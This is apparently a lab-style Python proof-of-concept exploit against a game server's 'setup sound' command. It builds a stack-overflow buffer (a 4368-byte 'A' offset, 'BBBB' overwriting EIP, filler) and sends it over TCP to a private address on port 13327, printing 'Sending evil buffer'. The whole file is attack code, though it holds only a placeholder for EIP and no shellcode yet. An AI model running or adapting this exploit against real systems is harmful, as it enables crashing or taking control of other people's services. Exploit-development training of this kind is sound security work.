#!/usr/bin/python
import socket

host = "192.168.193.44"

offset = "\x41" * 4368
eip    = "BBBB"
fill   = "C" * 7
buffer = "\x11(setup sound " + offset + eip + fill + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")

s.connect((host, 13327))
print(s.recv(1024))

s.send(buffer)
s.close()

print("[*] Payload sent!")
